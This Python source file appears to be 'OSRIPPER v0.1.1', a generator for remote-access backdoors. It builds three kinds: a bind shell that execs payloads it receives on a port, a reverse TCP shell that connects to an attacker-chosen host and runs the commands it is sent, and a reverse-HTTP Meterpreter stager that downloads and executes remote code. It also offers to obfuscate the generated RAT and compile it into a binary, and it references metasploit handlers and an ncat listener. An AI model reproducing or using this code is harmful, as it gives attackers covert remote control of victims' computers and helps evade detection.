import os
from pickle import GLOBAL
logo = """

░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓███████████████████████▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█████████████████████████████████▓▒░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓████████████████████████████████████████▓▒░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓███████████████████████████████████████████████▒░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░▒▓███████████████████████████████████████████████████▒░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░▓██████████████████████████████████████████████████▒░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░▓█████████████████████████████████████████████████▓▒░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░▓█████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░█████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░████████████████████████████████████████████████▓░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░▓███████████████████████████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░                                             
░░░░░░░░░░░░░░░▒███████████████▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓███████████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░█████████████▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓██████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░▓███████████▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓███▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░███████████▓▒▒▒▒▓▓▓▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓██▓▒▒▓▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░▒██████████▓▒▒▒█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓██▓▓▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░██████████▓▒▒▓██▓▓▓▓▒▒▒▒▒▒▒▓▓▒▒▓▒▓▓▓▓▓▓▓▒▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░██████████▒▒▓█▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
░░░░░░░░░░░░▒████████▓▓▒▒█▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▓▒▒▒▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓████████▓▒▒█▓█▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▓▒▒▒▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓█████████▓▓█░▓█▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▓▒▓▓▒▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓███████▓▒░▒▒▒▒▒▓█▓▓▓▓▓▓▓▒▒▒▒▒▓▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓██████▒░░▒▓▓▒▒▒▒▒▓▓█▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▒▒▓▓▓▒▒▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░██████░░░░▒▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▓▓▒▓▓▓▓▒▒▒▒▒▒▒▓▒▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▒████▓░░░░░▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓████▒░░░░░░▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓█████████▓▓▓▓▓▓▓▓█▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▒████░░░░░░░░░░░░░░▓▓▓▒▒▒▒▒▒▓▓▓████████▓▓▓▓▓██▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▒███▓░░░░░░░░░░░░░░▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓██▓▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░███▓░░░░░░░░░░░░░░▓▓▓▒▒▓▓▒█▒▒▒▒▒▒▓▓▓██▓▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░███▓░░░░░░░░░░░░░░▓▓▓▒▓▓▒▒█▒▓▓▒▒▒▓▓▓▒█▒▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░▒▒▒░░░░░░░░░░░░░░░░▒▓▓▒▒▒▓▓▒█▓▒▓▒▓▓▓░░░▓███▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▒▒▒▒▒▒▒▒▓▓▒▒░░░███▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▒▒▒▒▒▒▓▓▒░░░░██▓█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▒▒▒▓▓▓░░░░░█▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▓▓▓░░░░░█▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓▒▒░░░░▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒░░░░░▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                                                                           OSRIPPER v0.1.1
"""

clear = lambda: os.system('cls')
clear()
print(logo)
def gen_bind():
    global name
    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write('port = '+str(port))
        a = '''
import zlib,base64,socket,struct
b=socket.socket(2,socket.SOCK_STREAM)
b.bind(('0.0.0.0',int(port)))
b.listen(1)
s,a=b.accept()
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
    d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
                '''
        ina.write(a)
        ina.close
        print('(*) Generated Backdoor and saved as '+name)
        print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/bind_tcp')
def gen_rev():
    global name
    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
    host = input('Please enter the ip you wish the backdoor to connect back to: ')
    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write('port = '+str(port)+'\n')
        ina.write("\n")
        ina.write('hototo = "'+str(host)+'"')
        b = '''
import socket as s
import subprocess as r
from time import sleep
from urllib3 import Retry
def main():
    so=s.socket(s.AF_INET,s.SOCK_STREAM)
    try:
        so.connect((hototo,port))
        while True:
            d=so.recv(1024)
            if len(d)==0:
                break
            p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
            o=p.stdout.read()+p.stderr.read()
            so.send(o)
    except ConnectionRefusedError:
        sleep(5)
        main()
main()        
                    '''
        ina.write(b)
        ina.close
        print('(*) Generated Backdoor and saved as '+name)
        print('To open a listener you can run this command "ncat -lvnp '+port+'"')
def gen_rev_http():
    global name
    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
    host = input('Please enter the ip you wish the backdoor to connect back to: ')
    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write('port = str('+str(port)+")")
        ina.write("\n")
        ina.write('hototo = "'+str(host)+'"')
        a = '''
import zlib,base64,sys
vi=sys.version_info
ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener'])
hs=[]
o=ul.build_opener(*hs)
o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
url = str("http://"+hototo+":"+port)
exec(zlib.decompress(base64.b64decode(o.open(url+"/JALArVzOfB9_empuHWat8Az6GgFl8XzRNDQgjDZ-QsXX5ZRs4sWBMJUulKjhIghyXoqErAHsyIMqqR7Jr-qEaXKGr4ZNHLh4AkSO9ZooGjio7P4t6_-OIGMT_J35i3wKYoQ3ut4N8TiHvNPlBwb1e86d6o5_CsVR-dfthze7KLyeNggMgvtH1GP0zy5QrGH").read())))
                '''
        ina.write(a)
        ina.close
        print('(*) Generated Backdoor and saved as '+name)
        print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/reverse_http')  
def postgen():
    opt_obf = input('Do you want to obfuscate the rat (recommended) (y/n): ')
    if opt_obf == 'y':
        
        import obfuscator
        obfuscator.MainMenu(name)
        encrypted = True
        compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
        if compiling == 'y':
            if encrypted == True:
                compcomd = 'pyinstaller -F --hidden-import imp '+name+'_enc.py'
                os.system(compcomd)
                print('Saved under "dist" folder')
            else:
                compcomd = 'pyinstaller -F --hidden-import imp '+name
                os.system(compcomd)
                os.system(clear)
                print(logo)
                print('Backdoor saved under "dist" folder')
print("""BackDoor Module
        
        1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
        2. Create Reverse Shell (TCP (Encryption not recommended)) (Connects back to you)
        3. Create Reverse Meterpreter (HTTP) (Connects back to you)

""")  
encrypted = False     
nscan = input("Please select a module: ")
if nscan == "1":
    gen_bind()
    postgen()
if nscan == "2":
    gen_rev()
    postgen()
if nscan == "3":
    gen_rev_http()
    postgen()
